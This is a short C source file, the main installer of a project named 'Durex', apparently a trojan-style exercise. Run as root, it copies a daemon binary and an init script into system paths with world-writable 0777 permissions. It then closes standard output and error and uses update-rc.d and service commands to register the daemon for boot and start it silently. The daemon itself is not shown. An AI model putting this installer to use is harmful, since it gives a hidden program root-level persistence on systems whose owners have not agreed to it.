#include "../include/durex.h"

/**
 * Funzione di uscita con relativo codice per il debug
 * @param msg messaggio di uscita
 * @param exit_code codice di errore
 */
void 	exit_error(const char *msg, int exit_code)
{
	printf(RED"%s\n"NC, msg);
	exit(exit_code);
}

/**
 * Estrae un file e lo mappa in memoria
 * @param path percorso del file da estrarre completo di nome
 * @param size restituisce la dimensione del file
 * @return il puntatore alla mappa del file
 */
void 	*extract_file(const char* path, int* size)
{
	int 	fd = 0;
	void 	*ret = 0;

	if ((fd = open(path, O_RDWR)) < 0)
		exit_error("Failed to open file", 3);
	*size = lseek(fd, 0, SEEK_END);
	if ((ret = mmap(0, *size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED)
		exit_error("Error mapping file", 5);
	close(fd);
	return ret;
}

/**
 * Crea un file nel percorso indicato e copia al suo interno un contenuto
 * @param path percorso del file completo di nome
 * @param content contenuto da copiare nel file
 * @param size_content dimensione del contenuto da copiare
 */
void	create_file(const char* path, const void* content, int size_content)
{
	int		fd = 0;

	if ((fd = open(path, O_CREAT | O_RDWR, 0777)) < 0)
		exit_error("Failed to create daemon file", 2);
	write(fd, content, size_content);
	close(fd);
}

int 	main(void)
{
	int 	size_daemon = 0;
	int 	size_init = 0;
	void 	*daemon = 0;
	void 	*init_file = 0;

	if (getuid())
		exit_error("You need to be root to perform this command", 1);

	puts(USERNAME);

	daemon = extract_file(DAEMON, &size_daemon);
	create_file(PATH_DAEMON, daemon, size_daemon);
	init_file = extract_file(INIT, &size_init);
	create_file(PATH_INIT, init_file, size_init);

	if (munmap(daemon, size_daemon) == -1)
		exit_error("Error unmapping memory", 4);
	if (munmap(init_file, size_init) == -1)
		exit_error("Error unmapping memory", 5);

	close(1);
	close(2);
	system("update-rc.d -f Durex remove; update-rc.d -f Durex defaults; update-rc.d -f Durex enable; service Durex start");
}